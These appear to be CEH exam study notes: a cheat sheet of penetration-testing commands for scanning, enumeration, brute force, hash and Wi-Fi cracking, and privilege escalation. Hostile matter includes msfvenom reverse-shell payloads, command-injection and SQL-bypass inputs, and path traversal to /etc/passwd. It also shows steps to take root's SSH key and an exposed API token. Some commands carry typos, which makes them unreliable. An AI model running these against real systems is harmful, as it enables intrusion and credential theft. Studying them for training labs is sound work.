# CEH MASTER NOTES  <summary> </summary>

**ALWAYS DO SUDO SU**

## 1. SCANNING
### NETWORKS
**Own IP**<br>
ip a | ifconfig

**Scanning network Live Host (ping sweep)**  <br>
nmap -sP [host]/CIDR

**Scanning Live Host without port scan in same subnet (ARP Scan)** <br>
nmap -PR -sn [host]/CIDR

**Scripts + Version running on taget machine**<br>
nmap -sC -sV [host]/CIDR

**OS of the target machine**<br>
nmap -O [host]

**All open ports of the target**   <br>   
nmap -p- [host]/CIDR

**Specific port scan of the target**   <br>
nmap -p (port number) [host]/CIDR

**Aggressive scan**   <br>                         
nmap -A [host]/CIDR<br>
nmap -Pn -A x.x.x.1/24 -vv --open   

**Scanning using NSE scripts** <br>
nmap --scripts (script name) -p (port number) [host]/CIDR <br>
https://nmap.org/book/man-nse.html<br>
nmap --script smb-os-discovery.nse [host] (Displays OS, Computer-Name, Domain, WorkGroup and Ports.)

**Scripts + Version + Ports + OS Scan (overall)** <br>
nmap -sC -sV -p- -A -v -T4 [host]/CIDR

**Host discovery**    
netdiscover -i eth0 | netdiscover -r [host]/CIDR

**Live machines**<br>
sudo fping -a -g [host]/CIDR 2>/dev/null<br>
sudo nmap -sn [host]/CIDR

**Domain Controler**<br>
sudo nmap -p 389,445 --open -oG - [host]/CIDR | grep open
	
### WEB & SERVICES
nikto -h www.host.com

**Banner Grabbing**<br>
Use ID Serv from windows<br>
whatweb [host] <br>
zaproxy for web crawling <br>
nmap -A [host] and look at http-server-header for load balancing<br>
telnet [host] [port]<br>
nc -v [host] [port]<br>
nmap -sV [host]<br>
echo -e "HEAD / HTTP/1.1\r\nHost: [host]\r\nConnection: close\r\n\r\n" | nc [host] 80<br>
curl -I http://[host] <br>
openssl s_client -connect [host]:[port]<br>

**Geolocation**<br>
dig +short certifiedhacker.com | 162.241.216.11<br>
nmap --script ip-geolocation-geoplugin 162.241.216.11 

**Zone Transfer**<br>
dig ns certifiedhacker.com | ns2.bluehost.com<br>
dig axfr certifiedhacker.com @ns2.bluehost.com

**FQDN**<br>
nmap -sC -sV [host]<br>
Look for DNS Computer Name<br>
Find FQDN<br>
nmap -p389 –sV -iL [host]  or nmap -p389 –sV [host] (Find the FQDN in a subnet/network)<br>

## 2. SERVICE ENUMERATION

**Enumeration**<br>
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)<br>
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16<br>
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open<br>
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot<br>
4- DNS recon/enum-  dnsrecon -d www.google.com -z<br>
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 <br>
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)<br>
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)<br>

### FTP PORT 21
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp

**Brute force FTP**                         
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt [host] ftp <br>
hydra -l administrator -P /usr/share/wordlist/passwords.txt [host] ftp <br>
ncrack -U usernames.txt -P passwords.txt ftp://[host]<br>
ncrack -U usernames.txt -P passwords.txt [host]:21 -v <br>
medusa -h [host] -U usernames.txt -P passwords.txt -M ftp <br>
msf> auxiliary(scanner/ftp/ftp_login)><br>
set RHOSTS <target IP><br>
set user_file /path/usernames.txt<br>
set pass_file /path/passwords.txt<br>

**Download file from FTP after login** <br>
ls then get secret.txt

### SSH PORT 22
https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/

**Brute force username** <br>
hydra -l root -P passwords.txt [-t 32] [host] ssh<br>
msf> use scanner/ssh/ssh_enumusers

**Private key brute force**    <br>
msf> use scanner/ssh/ssh_identify_pubkeys

### TELNET PORT 23
https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet | https://www.hackingarticles.in/penetration-testing-telnet-port-23/ | https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#telnet

**Enumerate Telnet** <br>
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 [host]<be>

**Brute force Telnet credentials** <br>
hydra -l root -P passwords.txt [-t 32] [host] telnet <br>

### SMTP PORT 25
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

**Initiate a TCP connection to port 25**<br>
telnet [host]

**Finding MX servers of an organisation**    <br>
dig +short mx google.com

**Enumeration**  <br>
nmap -p25 --script smtp-commands [host]<br>
nmap -p25 --script smtp-open-relay [host] -v

### DNS PORT 53
https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

**Enumarate DNS**  <br>
dnsrecon -w -d [host] |  dnsrecon -d [host] -z<br>
dig NS certifiedhacker.com

**Brute forcing**  <br>
nmap --script dns-brute [host]

### NetBIOS PORT 137/138/139   
https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios

**Enumerate NetBIOS** <br>
nmap -sV -v [host] <br>
sudo nmap -sU --script nbstat.nse -p137 [host]<br>
enum4linux -u martin -p apple -n [host] (all info) <br>
enum4linux -u martin -p apple -P [host] (policy info)

**Enumerate NetBIOS from cmd**   <br>
nbtstat -a [host] (-c list contents of Netbios name cache)

**Enumerate Domain Users**	<br>
net use (Displays connection status, Shared folder/drive and Network Information) | net user | net user /domain | net user [username] | net user [username] /domain

### SNMP PORT 161
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp

**Enumarate SNMP**     <br>
nmap -sU [host]<be>
nmap -sU -p 161 --script=snmp-interfaces [host]

**Identify the processes running on the target machine**<br>
snmp-check [host] (it will show user accounts, processes etc)<br>
Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> snmp<br>
nmap -sU -p 161 --script=snmp-processes [host]

**List valid comunity strings of the server** <br>
msfconsole<br>
search snmp<br>
use auxiliary/scanner/snmp/snmp_login<br>
show options<br>
set RHOST [host]<br>
exploit

### LDAP PORT 389,636,3268,3269<br>
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

**Enumerate Users**<br>
enum4linux -U -o [host]<br>
ldapsearch -x -h 10.10.10.25 -p 389 -s base -b "" supportedLDAPVersion

### SMB PORT 445
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

**Enumarate Network File Shares**      <br>
Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> smb<br>
nmap --script smb-enum-shares.nse -p445 [host]<br>
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 [host]<br>
smbclient -L \\[host] <br>
enum4linux -U [host] - enumerate users <br>
enum4linux -S [host] - enumerates shares<br>
enum4linux -S [host] - password policy <br>
enum4linux -o [host] - operating system info <br>
enum4linux -l [host] - if target is DC will attempt to get some limites info about LDAP <br>
enum4linux -n [host] - NetBIOS info<br>
enum4linux -a [host] - all SMB info <br>
smbclient -L //hostname/ - enumerates all shares  <br>
smbmap -H [host] -d [domain] -u [user] =p [password] <br>

**Logged in Users details**    <br>
nmap --script smb-enum-users.nse -p445 IP<br>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]<br>

**Workgroups**    <br>
nmap --script smb-enum-users.nse -p445 [host]<br>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]

**Secutiry level information** <br>
nmap -sC -sV -A -T4 -p 445 [host]

**Domains & Services**  <br>
nmap --script smb-enum-services.nse -p445 [host]<br>
nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 [host]

**Brute force SMB**     <br>
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt (optional -vV) [host] smb<br>
nmap --script smb-brute -p 445 [host]

**Connect to SMB** <br>
smbclient //[host]/<share_name) -W <domain_name> -U <Username%password>

**Mount SMB share to kali**<br>
sudo mount -t cifs //[host]/<share_name> /<local path> -o username=<username>,password=<password><br>
nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 [host]

### RDP PORT 3389
https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp

**Use metasploit to confirm the services running is RDP**<br>
msfconsole -q<br>
search rdp<br>
use auxiliary/scanner/rdp/rdp_scanner<br>
show options<br>
set RHOST [host]<br>
set RPORT 3333 (if there is no port 3389 on the target)<br>
exploit

**Use hydra to brute force the login credentials**  <br>
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://[host] -p 3389

**Crowbar**<br>
git clone https://github.com/galkan/crowbar<br>
cd crowbar/<br>
pip3 install -r requirements.txt<br>

RDP brute forcing a single IP address using a single username and a single password:<br>
./crowbar.py -b rdp -s [host]/32 -u admin -c Aa123456<br>

RDP brute forcing a single IP address using username list file and a single password:<br>
./crowbar.py -b rdp -s [host]/32 -U ~/Desktop/userlist -c passw0rd<br>

RDP brute forcing a single IP address using a single username and a password list:<br>
./crowbar.py -b rdp -s [host]/32 -u localuser -C ~/Desktop/passlist<br>

SSH key brute force attempt to a single IP address using a single username and a single private SSH key:<br>
./crowbar.py -b sshkey -s [host]5/32 -u root -k ~/.ssh/id_rsa<br>

SSH key brute force attempt to a single IP address using a single username and all the SSH keys in a folder:<br>
./crowbar.py -b sshkey -s [host]/32 -u root -k ~/.ssh/<br>

SSH key brute force attempt to a subnet using a single username and all the SSH keys in a folder in discovery mode:<br>
./crowbar.py -b sshkey -s [host]/24 -u root -k ~/.ssh/ -d<br>

VNC brute force attempt to a single IP address using a password file with specified port number:<br>
./crowbar.py -b vnckey -s [host]/32 -p 5902 -k ~/.vnc/passwd<br>

**Use RDP tools to connect to machine OR RDP from WINDOWS**     <br>
xfreerdp /u:<username> /p:<password> /v:[host]:3389

### HTTP/HTTPS PORT 80/443/8080/8081
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web

**General purpose automatic scanners**<br>
Copy<br>
nikto -h <URL><br>
whatweb -a 4 <URL><br>
wapiti -u <URL><br>
W3af<br>
zaproxy #You can use an API<br>
nuclei -ut && nuclei -target <URL><br>

**CMS scanners**<br>
cmsmap [-f W] -F -d <URL><br>
wpscan --force update -e --url <URL><br>
joomscan --ec -u <URL><br>
joomlavs.rb #https://github.com/rastating/joomlavs

https://github.com/ignis-sec/puff (client side vulns fuzzer)<br>
node puff.js -w ./wordlist-examples/xss.txt -u "http://www.xssgame.com/f/m4KKGHi2rVUN/?query=FUZZ

### Port Login
**SSH** (Secure Shell) - Port 22<br>
ssh username@hostname <br>

**Telnet** - Port 23<br>
telnet hostname<br>

**FTP** (File Transfer Protocol) - Port 21<br>
ftp hostname or lftp ftp://hostname <br>

**SFTP** (Secure File Transfer Protocol) - Port 22<br>
sftp username@hostname <br>

**HTTP** (HyperText Transfer Protocol) - Port 80<br>
curl http://hostname <br>

**HTTPS** (HyperText Transfer Protocol Secure) - Port 443<br>
curl https://hostname <br>

**SMB** (Server Message Block) - Port 445<br>
smbclient //hostname/share <br>
smbclient -L //hostname/ -U '' -N - to log in with blank user and no pass

**RDP** (Remote Desktop Protocol) - Port 3389<br>
xfreerdp /v:hostname /u:username /p:password <br>

**MySQL** - Port 3306<br>
mysql -u username -h hostname -p<br>

**PostgreSQL** - Port 5432<br>
psql -h hostname -U username -d database <br>

**VNC** (Virtual Network Computing) - Port 5900<br>
vncviewer hostname:port <br>

**Netcat** - Arbitrary Ports<br>
nc hostname port <br>

**POP3** (Post Office Protocol) - Port 110<br>
telnet hostname 110 <br>

**IMAP** (Internet Message Access Protocol) - Port 143<br>
telnet hostname 143 <br>

**LDAP** (Lightweight Directory Access Protocol) - Port 389<br>
ldapsearch -x -H ldap://hostname -b "baseDN"<br>

**SNMP** (Simple Network Management Protocol) - Port 161<br>
snmpwalk -v2c -c community hostname<br>

**SMTP** (Simple Mail Transfer Protocol) - Port 25<br>
telnet hostname 25 or swaks --to email@example.com --server hostname <br>

## 3. System Hacking
https://nvd.nist.gov/vuln/search

**OpenVAS**<br>
Vulnerability scanner
start from Applications -> open browser -> 127.0.0.1:9392 -> admin/password

**To create a Payload**<br>
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 

**To take a reverse TCP connection from windows**<br>
msfdb init && msfconsole <br>
use exploit/multi/handler<br>
set payload windows/meterpreter/reverse_tcp<br>
set LHOST= attacker-IP  <br>
set LPORT= attacker-Port <br>
run<br>

## 4. SNIFFING

### Filtering packets 
**Password Sniffing using Wireshark**<br>
In pcap file apply filter: http.request.method==POST or http.request.method==get(you will get all the post or get request) <br>
Follow HTTP stream. <br>
Type "pwd" in the find section.

**To the Find DOS & DDOS**<br>
Go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer<br>
Statistics > Conversations > IPv4 > Packets<br>
To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0

**To find sniffing**<br>
Ctrl+F duplicate

**IoT**<br>
Filter mqtt

**To the get the specific method like (post, get)** <br>
http.request.method==post <br>
http.request.method==get

### Follow up Streams
select_packet > follow > TCP Stream

**To find the message hidden with CovertTCP**<br>
Apply filter tcp. Under IPv4 -> Identification follow the message.

**Finding severity**<br>
Open pcapng file and go to Analyze -> Expert Information

**Identify Target system OS with (Time to Live) TTL and TCP window sizes using wireshark**<br>
Check the target IP Time to live value with protocol ICMP. <br>
If it is 128 then it is Windows, as ICMP value came from Windows. <br>
If TTL is 64 then it is Linux. <br>
Every OS has a different TTL. <br>
TTL 254 is solaris.<br>

## 5. Steganography

**SNOW** - for hiding and extracting hidden data from a text file<br>
**Openstego** - for hiding and extracting hidden data from an image file<br>
**CovertTCP** - for hiding data in TCP/IP packet headers

### SNOW

run cmd from SNOW folder<br>
SNOW.EXE -C -m “hidden text” -p “password” input.txt output.txt<br>
-C - compile<br>
-m - text we want to hide<br>
-p - password<br>
Extracting data:<br>
SNOW.EXE -C -p password output.txt

**Steghide**<br>
steghide extract -sf image.(JPEG or BMP Image)<br>

### Openstego<br>
2 options to Hide or Extract data

**Hide Data**<br>
Click Hide Data<br>
Select a file<br>
Select a cover file<br>
Give a output file name<br>
Click on Hide Data button

**Extract Data**<br>
Click on Extract Data<br>
Select the image<br>
Select the output file<br>
Click on Extract Data

### CovertTCP<br>
Covert TCP help us to hide the data that is being sent over the network by manipulating the TCP/IP header.<br>
We send the data in the left out spaces present in the header 1 Byte at a time.<br>

cc -o covert_tcp covert_tcp.c (On both client and server)<br>

**Sender Machine**<br>
./covert_tcp -source <ip address of sender> -dest <ip address of receiver> -source_port <origin port number> -dest <reciever port number> -file <file name> 

**Receiver Machine**<br>
./covert_tcp -source <ip address of sender> -source_port <sender destination port number> -server -file <file name>

## 6. Cryptography

**l0phtCrack**<br>
Password auditing wizard

**Hash Identifier**<br>
https://www.onlinehashcrack.com/hash-identification.php<br>

sha224sum <file>

**Hash Crack**<br>
https://crackstation.net/<br>
https://hashes.com/en/decrypt/hash

Img hidden - Openstego<br>
.hex - Cryptool<br>
Whitespace - SNOW<br>
MD5 - Hashcalc & MD5 Calculator<br>
Encoded - BCTexteditor<br>
Volume & mount - Veracrypt

### Hashmyfiles<br>
for calculating and comparing hashes of files<br>

Drag and drop files to check if they are tampered

### Cryptool** <br>
for encryption/decription of the hex data - by manipulating the key length<br>
Encryption and key should be in the file name.

### BcTextEncoder <br>
for encoding and decoding text in a file (.hex)

### CryptoForge <br>
for encrypting/decrypting the files<br>
Choose the encription/decription type and add the key<br>

When installed you will get the option when right clicking on a file to encrypt/decrypt

### VeraCrypt <br>
for hiding and encrypting the disk partiotions

### hashcat

Hashcat -a 3 -m 900 hash.txt /rockyou.txt<br>
-a attack mode<br>
-m hashtype<br>
900 md4<br>
1000 NTLM<br>
1800 SHA512CRYPT<br>
110 SHA1 with SALT HASH<br>
0  MD5<br>
100 SHA1<br>
1400 SHA256<br>
3200 BCRYPT<br>
160 HMAC-SHA1<br>

### John

**First analyze hash type**<br>
john hashfile.hash

**Then crack hash**
john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`<br>

**Show the cracked password**<br>
john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash

### hydra

**FTP**: <br>
hydra -l user -P passlist.txt ftp://[host]<br>
hydra -L userlist.txt -P passlist.txt ftp://[host]
    
**SSH**: <br>
hydra -l <username> -P <full path to pass> [host] -t 4 ssh<br>

Post Web Form: <br>
hydra -l <username> -P <wordlist> [host] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V<br>

- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[host]`<br>
- `hydra -l root -P passwords.txt [-t 32] [host] ftp<br>
- `hydra -L usernames.txt -P pass.txt [host] mysql<br>
- `hydra -l USERNAME -P /path/to/passwords.txt -f [host] pop3 -V`<br>
- `hydra -V -f -L <userslist> -P <passwlist> rdp://[host]`<br>
- `hydra -P common-snmp-community-strings.txt target.com snmp<br>
- `hydra -l Administrator -P words.txt [host] smb t 1<br>
- `hydra -l root -P passwords.txt [host] ssh<br>

### wpscan

**Wordpress site only Users Enumeration** <br>
wpscan --url http://example.com <br>
wpscan --url http://example.com/ceh --enumerate u<br>
wpscan –url [wordpress URL] –wordlist [path to wordlist] –username [username to brute force] –threads [number of threads to use]

**Direct crack if we have user/password detail** <br>
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt<br>
wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt<br>

## 7. Hacking WebServers & WebApps

**Directory Bruteforcing**<br>
gobuster dir -u http://site-being-tested.com -w /home/attacker/Desktop/common.txt<br><br>
gobuster dir -u https://example.com -w /wordlists/Discovery/Web-Content/big.txt -t 4 --delay 1s -o results.txt
gobuster dir -u https://example.com -w /wordlists/Discovery/Web-Content/big.txt  -x .php, .txt  -t 4 --delay 1s -o results.txt<br>

dirb http://site-being-tested.com<br>
dirb http://site-being-tested.com /path/to/wordlist1,/path/to/wordlist2<br>

sublist3r -d example.com <br>
crt.sh/?q=example.com <br>
amass enum -d example.com <br>
Search for site:example.com on Google to find indexed subdomains. <br>

**Enumerate a Web Application using WPscan & Metasploit**<br>
wpscan --url http://[host]:[port]/NEW --enumerate u  (u means username) <br>
Then type msfconsole to open metasploit. <br>
Type -  use auxilliary/scanner/http/wordpress_login_enum<br>
 						 show options<br>
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt<br>
						 set RHOSTS [host]  (target ip)<br>
						 set RPORT <pot>    (target port)<br>
						 set TARGETURI http://[host]:<pot>/<br>
						 set USERNAME admin

**Find if application is vulnerable to XSStrike**<br>
git clone https://github.com/s0md3v/XSStrike<br>
cd XSStrike<br>
pip install -r requirements.txt<br>
python xsstrike.py -u http://www.cehorg.com

**Command Injection**<br>
10.10.10.25:8080/DVWA<br>
use admin/password to login<br>
click on Command Injection<br>
10.10.10.25 will ping<br>
lower security to low in DVWA security<br>
127.0.0.1 && net user<br>
127.0.0.1 && type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt<br>

### Nslookup<br>
**To verify Website's Ip**<br>
Nslookup wwww.example.com

### File Upload Vulnerability
**To create a PHP Payload**<br>
Copy the PHP code and create a .php<br>
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw

**To create a Reverse_tcp Connection**<br>
msfconsole<br>
use exploit/multi/handler<br>
set payload php/meterepreter/reverse_tcp<br>
set LHOST = attacker-ip<br>
set LPORT = attcker-port<br>
run

**To find the secret file**<br>
type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
  
### SQL Injection<br>
Login bypass with [' or 1=1 --]

**OWASP ZAP**<br>
Open the ZAP <br>
Add the webiste name to Autoscan<br>
Click on the Alert tab to know about Vulnerabilities

**DSSS**<br>
Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)<br>

As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.<br>

python3 dsss.py -u "url" --cookie="cookie"

### sqlmap
Open the vulnerable website - [host] (exmpl: http://movies.cehorg.com/viewprofile.aspx?id=1)<br>
Copy the cookie from the inspect element -> Console -> type document.cookie and copy the result - <cookie> (exmpl: mscope=Xf4nda2RM2w=; ui-tabs-1=0)<br>
Open the terminal to use sqlmap 

**List databases, add cookie values**<br>
sqlmap -u "[host]" --cookie=”<cookie>” --dbs <br>
OR<br>
sqlmap -u "[host]" --cookie=”<cookie>; security=low”   --data="id=1&Submit=Submit" --dbs  <br>

**List Tables, add databse name**<br>
sqlmap -u “[host]” --cookie="<cookie>" -D <DataBase> --tables<br>
OR<br>
sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> --tables<br>  

**List Columns of that table**<br>
sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table>--columns

**Dump all values of the table**<br>
sqlmap -u “[host]” --cookie="<cookie>" -D <DataBase> -T <Table> --dump<br>
OR<br>
sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --dump

**MySQL**<br>
mysql -U qdpmadmin -h [host] -P passwod <br>
show databases;<br>
use qdpm;<br>
show tables'<br>
select * from users;<br>
show dtabases;<br>
use staff;<br>
show tables;<br>
select * from login;<br>
select * from user;<br>

When you have username and Password for the database.

**Enumerate and hack a web app using wpscan and metasploit**

wpscan — api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads — url http://10.10.10.16:8080/CEH — plugins-detection aggressive — enumerate u <br>
— enumerate u: Specify the enumeration of users <br>
API Token: Register at https://wpscan.com/register <br>
Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads <br>
service postgresql start <br>
msfconsole<br>
use auxiliary/scanner/http/wordpress_login_enum<br>
show options<br>
set PASS_FILE password.txt<br>
set RHOST 10.10.10.16<br>
set RPORT 8080<br>
set TARGETURI http://10.10.10.16:8080/CEH<br>
set USERNAME admin<br>
run<br>
Find the credential

**Directory or Path Traversal** <br>
192.168.1.1/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd

**Null Byte** <br>
?page=../../../../../etc/passwd%00
  
## 8. Hacking Android

### ADB
**To Install ADB**<br>
apt-get update<br>
sudo apt-get install adb -y<br>
adb devices -l

**Connection Establish Steps**<br>
adb connect x.x.x.x:5555<br>
adb devices -l<br>
adb shell  

**To navigate**<br>
pwd<br>
ls<br>
cd Download<br>
ls<br>
cd sdcard<br>

**Download a File from Android using ADB tool**<br>
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt <br>
adb pull sdcard/log.txt /home/mmurphy/Desktop

### PhoneSploit
**To install Phonesploit**<br>
git clone https://github.com/aerosol-can/PhoneSploit<br>
cd PhoneSploit<br>
pip3 install colorama<br>
OR<br>
python3 -m pip install colorama<br>

**To run Phonesploit**<br>
python3 phonesploit.py<br>

Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device<br>
Type 4, to Access Shell on phone<br>
Download File using PhoneSploit<br>
9. Pull Folders from Phone to PC<br>
Enter the Full Path of file to Download<br>
sdcard/Download/secret.txt

**Check Android App**<br>
www.sisik.eu/apk-tool

## 9. Cracking Wi-Fi networks<br>
**Cracking Wifi Password**<br>
aircrack-ng [pcap file] (For cracking WEP network)<br>
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)<br>

Android<br>
1- nmap ip -sV -p 5555    (Scan for adb port)<br>
2- adb connect IP:5555    (Connect adb with parrot)<br>
3- adb shell              (Access mobile device on parrot)<br>
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)<br>

SQLMap - for finding SQL Injection Vulnerabilities<br>
Wpscan - scanning and finding issues in wordpress websites<br>
ADB - for connecting Android devices to PC and binary analysis<br>
Burpsuite - for analysing and manipulating the traffic<br>

## 10. Privilege Escalation Basics
ssh <user_name>@<IP> -p [port]<br>

to check privileges<br>
sudo -l

if there is a user with no pass:<br>
sudo -u <user> /bib/bash<br>
cd \<br>
cd /root<br>
cd .ssh<br>
cat id_rsa<br>
copy the key<br>

nano id_rsa<br>
paste the key<br>
ctrlS ctrlX<br>
chmod 600 id_rsa<br>

ssh root@<IP> -p [port] -i id_rsa<br>
*******************************<br>
ssh-keygen -t rsa<br>
cat ~/.ssh/id_rsa.pub | ssh USER@HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"<br>

ssh <user_name>@<IP> -p [port] -i id_rsa<br>
*******************************<br>
- 1st_file we have permission<br>
- 2nd file we do not have permission<br>

stat -c “%a %A %U %G %F” <file><br>

strings <file><br>
if the second file is there:<br>
rm <2nd_file><br>
cp /bin/bash <2nd_file><br>
/<1sr_file><br>
*******************************<br>
cd /var/www/html<br>
grep -nr “db_user”<br>
cat <link><br>

su or sudo su if we find the pass<br>
*******************************<br>
LinEnum<br>

copy url<br>
git clone <url><br>
cd LinEnum<br>

LinPEAS<br>
copy latest version<br>
wget <paste><br>
chmod +x linpeas.sh<br>

./LinEnum.sh<br>
./linepeas.sh<br>


## 11. Malware Threats (RAT)
5 RAT tools<br>

njRAT | MoSucker | ProRat | Theef | HTTP RAT<br>

**To examine malware**<br>
Use DIE<br>
For Strings for file pos<br>
Sample-ELF->Info for Info<br>

**To examine event logs**<br>
Use jv16PowerTools<br>

**To examine windows services**<br>
Use ServiceManager from CEH tools<br>

**Starvation attacks**<br>
Use Yersinia:<br>
sudo yersinia -G<br>
open Wireshark<br>
Start DHCP Discover packets attack<br>
filter bootp.type==1 in Wireshark<br>

## 12. System Hacking
**To create a Payload** <br>
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 

**To take a reverse TCP connection from windows** <br>
msfdb init && msfconsole  <br>
use exploit/multi/handler <br>
set payload windows/meterpreter/reverse_tcp <br>
set LHOST= attacker-IP   <br>
set LPORT= attacker-Port <br>
run

**File Transfer**

**Linux to Windows**<br>
used to send a payload by Apache<br>
mkdir /var/www/html/share<br>
chmod -R 755 /var/www/html/share<br>
chown -R www-data:www-data /var/www/html/share<br>
cp /root/Desktop/filename /var/www/html/share/<br>
to start and verify<br>
service apache2 start <br>
service apache2 status<br>
to Download from Windows<br>
Open browser<br>
IP_OF_LINUX/share<br>

**Windows to Linux**<br>
File system > Network > smb///IP_OF_WINDOWS
